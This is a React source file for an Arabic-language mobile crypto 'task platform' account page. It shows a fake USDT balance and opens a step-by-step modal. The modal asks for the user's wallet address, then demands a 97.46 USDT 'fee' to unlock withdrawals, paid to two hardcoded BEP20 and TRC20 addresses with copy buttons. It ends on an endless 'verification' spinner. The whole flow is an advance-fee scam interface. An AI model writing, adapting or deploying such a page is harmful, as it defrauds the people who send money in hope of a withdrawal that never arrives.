
import React, { useState } from 'react';
import { 
  WalletIcon, 
  CardIcon, 
  ChatIcon, 
  ChevronRightIcon, 
  UserIcon, 
  TeamIcon, 
  FileTextIcon,
  CardBundleIcon,
  InviteIcon,
  SettingsIcon
} from './components/Icons';

const App: React.FC = () => {
  const [modalStep, setModalStep] = useState<number>(1);
  const [walletAddress, setWalletAddress] = useState<string>('');

  const nextStep = () => setModalStep(prev => prev + 1);

  return (
    <div className={`relative flex flex-col min-h-screen bg-[#F8F9FA] text-[#333] pb-24 select-none max-w-[430px] mx-auto shadow-xl overflow-x-hidden font-sans ${modalStep > 0 ? 'h-screen overflow-hidden' : ''}`}>
      
      {/* Background Content (Main Page) */}
      <div className={`${modalStep > 0 ? 'blur-[1.5px] pointer-events-none' : ''} transition-all duration-300`}>
        {/* Header Section */}
        <header className="relative w-full px-5 pt-10 pb-10 bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50]">
          <div className="absolute top-6 right-5 cursor-pointer">
             <ChatIcon />
          </div>

          <div className="flex items-center space-x-3 mb-8">
            <div className="w-[72px] h-[72px] rounded-full bg-white flex items-center justify-center overflow-hidden">
              <div className="w-full h-full bg-gray-200"></div>
            </div>
            <div className="flex flex-col text-white text-left">
              <div className="flex items-center space-x-2">
                <span className="text-[20px] font-bold tracking-tight">Roro12345</span>
                <div className="bg-[#F5B400] text-white text-[10px] px-1.5 py-0.5 rounded-[4px] font-bold italic flex items-center justify-center">
                  VIP1
                </div>
              </div>
              <span className="text-[14px] opacity-90 mt-1">شفرة الدعوة: 929047</span>
            </div>
          </div>

          <div className="flex justify-between items-end mt-4">
            <div className="text-white text-left">
              <span className="text-[15px] opacity-90 block mb-1">حساب شخصي</span>
              <div className="flex items-center space-x-1">
                 <span className="text-[14px] font-medium opacity-90 mr-1">USDT</span>
                 <span className="text-[26px] font-bold leading-none tracking-tight">370.0929</span>
              </div>
            </div>
            
            <div className="flex space-x-6 items-center">
              <div className="flex flex-col items-center">
                <div className="w-[54px] h-[54px] rounded-[20px] bg-[#F5F5F5] flex items-center justify-center shadow-md">
                  <div className="w-[32px] h-[32px] rounded-md bg-gradient-to-b from-[#1F6AE1] to-[#0B4DB8] flex items-center justify-center text-white p-1">
                     <WalletIcon className="w-full h-full" />
                  </div>
                </div>
                <span className="text-white text-[11px] mt-2 font-medium">تعبئة رصيد</span>
              </div>
              
              <div className="flex flex-col items-center">
                <div className="w-[54px] h-[54px] rounded-[20px] bg-[#F5F5F5] flex items-center justify-center shadow-md">
                  <div className="w-[32px] h-[32px] rounded-md bg-gradient-to-b from-[#1F6AE1] to-[#0B4DB8] flex items-center justify-center text-white p-1">
                    <CardIcon className="w-full h-full" />
                  </div>
                </div>
                <span className="text-white text-[11px] mt-2 font-medium">سحب المال</span>
              </div>
            </div>
          </div>
        </header>

        {/* Feature Icons Row */}
        <div className="grid grid-cols-4 gap-0 bg-white py-6 shadow-sm border-b border-gray-100">
          <FeatureItem icon={<TeamIcon />} label="فريق" />
          <FeatureItem icon={<FileTextIcon />} label="سجل" />
          <FeatureItem icon={<CardBundleIcon />} label="إدارة حزمة البطاقة" />
          <FeatureItem icon={<InviteIcon />} label="ادع أصدقاء" />
        </div>

        {/* Menu List Section */}
        <div className="mt-4 bg-white border-t border-b border-gray-100 divide-y divide-gray-100">
          <MenuListItem icon={<UserIcon />} label="معلومات شخصية" />
          <MenuListItem icon={<FileTextIcon className="w-6 h-6 text-gray-400" />} label="سجل الإيداع" />
          <MenuListItem icon={<CardIcon className="w-6 h-6 text-gray-400" />} label="تفاصيل الانسحاب" />
          <MenuListItem icon={<SettingsIcon />} label="إعدادات العملية" />
        </div>

        {/* Bottom Navigation */}
        <nav className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 flex justify-around items-center h-[72px] px-1">
          <BottomNavItem icon={<HomeIcon />} label="الصفحة الأمامية" />
          <BottomNavItem icon={<HeadsetIcon />} label="خدمة الزبائن" />
          <BottomNavItem icon={<StoreIcon />} label="قائمة الطعام" />
          <BottomNavItem icon={<CalendarIcon />} label="سجل" />
          <BottomNavItem icon={<UserNavIcon />} label="أنا" active />
        </nav>
      </div>

      {/* Modal Overlay System */}
      {modalStep > 0 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/30 animate-fade-in">
          <div className="bg-white rounded-[24px] w-full max-w-[340px] shadow-2xl overflow-hidden animate-zoom-in text-center p-6 flex flex-col items-center">
            
            {/* Step 1: Welcome */}
            {modalStep === 1 && (
              <>
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-4">
                  <span className="text-2xl">👋</span>
                </div>
                <h3 className="text-lg font-bold text-gray-800 mb-3">أهلاً بك Roro12345</h3>
                <p className="text-gray-600 text-sm leading-relaxed mb-6">
                  تم حل أمر المهام ضمن اتفاق برتكول بين منصتنا ومنصه <span className="font-bold text-blue-600">mini pro</span>. اضغط التالي للمتابعة.
                </p>
                <button 
                  onClick={nextStep}
                  className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white py-3.5 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
                >
                  التالي
                </button>
              </>
            )}

            {/* Step 2: Wallet Address Input */}
            {modalStep === 2 && (
              <>
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-4">
                   <WalletIcon className="w-8 h-8 text-blue-500" />
                </div>
                <h3 className="text-lg font-bold text-gray-800 mb-3">رابط المحفظة</h3>
                <p className="text-gray-500 text-xs mb-4">يرجى إدخال رابط محفظتك الخاص لسحب الأرباح</p>
                <input 
                  type="text"
                  placeholder="رابط المحفظة..."
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 mb-6 text-sm text-center focus:outline-none focus:ring-2 focus:ring-[#9B4A4E]/20"
                />
                <button 
                  onClick={nextStep}
                  disabled={!walletAddress}
                  className="w-full bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white py-3.5 rounded-xl font-bold shadow-lg active:scale-95 transition-transform disabled:opacity-50"
                >
                  التالي
                </button>
              </>
            )}

            {/* Step 3: Deposit Info */}
            {modalStep === 3 && (
              <div className="w-full text-right" dir="rtl">
                <h3 className="text-lg font-bold text-gray-800 mb-2 text-center">خطوة أخيرة</h3>
                <p className="text-gray-600 text-[13px] leading-relaxed mb-4">
                  أهلاً بك <span className="font-bold">Roro12345</span> بقي أمر إيداع مبلغ <span className="text-[#9B4A4E] font-bold text-lg">97.46 USDT</span> لفتح قناة السحب.
                </p>
                <div className="bg-amber-50 border border-amber-100 p-3 rounded-lg mb-4">
                  <p className="text-[11px] text-amber-700 leading-tight">
                    هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
                  </p>
                </div>

                <div className="space-y-3 mb-6">
                  <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                    <div className="flex justify-between items-center mb-1">
                      <span className="text-[11px] font-bold text-blue-600">USDT BEP20</span>
                      <button onClick={() => {
                        navigator.clipboard.writeText('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d');
                        alert('تم نسخ العنوان');
                      }} className="text-[10px] bg-white px-2 py-0.5 rounded border active:bg-gray-100">نسخ</button>
                    </div>
                    <p className="text-[10px] break-all font-mono text-gray-500">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
                  </div>

                  <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
                    <div className="flex justify-between items-center mb-1">
                      <span className="text-[11px] font-bold text-red-600">Tron TRC20</span>
                      <button onClick={() => {
                        navigator.clipboard.writeText('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai');
                        alert('تم نسخ العنوان');
                      }} className="text-[10px] bg-white px-2 py-0.5 rounded border active:bg-gray-100">نسخ</button>
                    </div>
                    <p className="text-[10px] break-all font-mono text-gray-500">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</p>
                  </div>
                </div>

                <button 
                  onClick={nextStep}
                  className="w-full bg-[#28C76F] text-white py-3.5 rounded-xl font-bold shadow-lg active:scale-95 transition-transform"
                >
                  تم الإيداع
                </button>
              </div>
            )}

            {/* Step 4: Final Confirmation */}
            {modalStep === 4 && (
              <>
                <div className="w-16 h-16 border-4 border-[#28C76F]/20 border-t-[#28C76F] rounded-full animate-spin mb-6"></div>
                <h3 className="text-lg font-bold text-gray-800 mb-3">عملية التحقق</h3>
                <p className="text-gray-600 text-sm leading-relaxed mb-6">
                  الرجاء الانتظار للتأكد من عملية الإيداع. سيتم تحديث حالة حسابك فور التأكيد من الشبكة.
                </p>
                <div className="text-xs text-gray-400 italic">قد يستغرق ذلك بضع دقائق...</div>
              </>
            )}

          </div>
        </div>
      )}

      {/* Visual Bottom Bar */}
      <div className="fixed bottom-1 left-1/2 -translate-x-1/2 w-24 h-1 bg-gray-300 rounded-full z-[60]"></div>
    </div>
  );
};

// Internal Components
const FeatureItem: React.FC<{ icon: React.ReactNode; label: string }> = ({ icon, label }) => (
  <div className="flex flex-col items-center justify-center text-center px-1 active:opacity-60 transition-opacity cursor-pointer">
    <div className="mb-2">{icon}</div>
    <span className="text-[12px] text-gray-600 font-medium whitespace-nowrap overflow-hidden text-ellipsis w-full px-1">{label}</span>
  </div>
);

const MenuListItem: React.FC<{ icon: React.ReactNode; label: string }> = ({ icon, label }) => (
  <div className="flex items-center justify-between px-5 py-4 active:bg-gray-50 transition-colors cursor-pointer group">
    <div className="flex items-center space-x-3">
      <div className="w-6 h-6 flex items-center justify-center">{icon}</div>
      <span className="text-[16px] text-gray-700 font-medium">{label}</span>
    </div>
    <ChevronRightIcon />
  </div>
);

const BottomNavItem: React.FC<{ icon: React.ReactNode; label: string; active?: boolean }> = ({ icon, label, active }) => (
  <div className={`flex flex-col items-center justify-center flex-1 cursor-pointer transition-all ${active ? 'text-[#333]' : 'text-gray-400'}`}>
    <div className={`mb-1 transition-transform ${active ? 'scale-110' : 'scale-100'}`}>{icon}</div>
    <span className={`text-[10px] font-bold ${active ? 'text-[#333]' : 'text-gray-400'}`}>{label}</span>
  </div>
);

// Navigation Icons
const HomeIcon = () => (
  <svg viewBox="0 0 24 24" className="w-[26px] h-[26px]" fill="none" stroke="currentColor" strokeWidth="2"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
);
const HeadsetIcon = () => (
  <svg viewBox="0 0 24 24" className="w-[26px] h-[26px]" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 1c-4.97 0-9 4.03-9 9v7c0 1.66 1.34 3 3 3h3v-8H5v-2c0-3.87 3.13-7 7-7s7 3.13 7 7v2h-4v8h3c1.66 0 3-1.34 3-3v-7c0-4.97-4.03-9-9-9z"/></svg>
);
const StoreIcon = () => (
  <svg viewBox="0 0 24 24" className="w-[26px] h-[26px]" fill="none" stroke="currentColor" strokeWidth="2"><path d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"/></svg>
);
const CalendarIcon = () => (
  <svg viewBox="0 0 24 24" className="w-[26px] h-[26px]" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
);
const UserNavIcon = () => (
  <svg viewBox="0 0 24 24" className="w-[26px] h-[26px]" fill="none" stroke="currentColor" strokeWidth="2"><path d="M16 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="10" cy="7" r="4"/></svg>
);

export default App;
